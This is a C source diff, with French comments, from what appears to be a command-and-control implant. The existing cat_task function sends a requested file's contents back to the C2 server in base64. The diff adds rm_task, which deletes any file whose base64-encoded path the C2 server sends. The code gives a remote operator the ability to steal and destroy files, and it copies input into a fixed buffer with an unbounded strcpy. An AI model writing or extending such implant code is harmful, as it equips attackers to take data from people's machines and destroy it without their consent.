@@ -71,7 +71,7 @@ char * sleep_task(char * buffer_fetch, char * dest_result) {
 char * cat_task(char * buffer_fetch, char * dest) {
     /*
     Tache qui affiche le contenu d'un fichier sur demande du C2
-    format de l'entrée : CAT,847532c65b,Li90ZXN0
+    format de l'entrée : CAT,847532c65b,Li90ZXN0  dest est vide
     format de la sortie : e2f6421cfa : ID de la tache
     modifie dest : contient la base 64 du fichier
     */
@@ -148,5 +148,49 @@ char * cat_task(char * buffer_fetch, char * dest) {
     free(encoded_content);
     free(decoded_file_path);
 
+    return task_ID_copy;
+}
+
+
+char * rm_task(char * buffer_fetch) {
+    /*
+    Tache qui supprime un fichier sur demande du C2
+    format de l'entrée : RM,3f5c2fd1d3,L2hvbWUvbWVsby9tYWluLmM=
+    */
+
+    char buffer[1024];
+    strcpy(buffer, buffer_fetch); // Create a copy to avoid modifying original string
+
+    char * command = strtok(buffer, ",");
+    if (strcmp(command, "RM") != 0) {
+        printf("Invalid command\n");
+        return NULL;
+    }
+
+    char * task_ID = strtok(NULL, ",");
+    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID
+
+    char * file_path = strtok(NULL, ",");
+    if (file_path == NULL) {
+        printf("Missing file path\n");
+        free(task_ID_copy);
+        return NULL;
+    }
+
+    char * decoded_file_path = NULL;
+    decoder_base64(file_path, &decoded_file_path);
+    if (decoded_file_path == NULL) {
+        printf("Failed to decode file path\n");
+        free(task_ID_copy);
+        return NULL;
+    }
+
+    if (remove(decoded_file_path) == 0) {
+        printf("File %s deleted successfully\n", decoded_file_path);
+    } else {
+        perror("Error deleting file");
+    }
+
+    free(decoded_file_path);
     return task_ID_copy;
 }
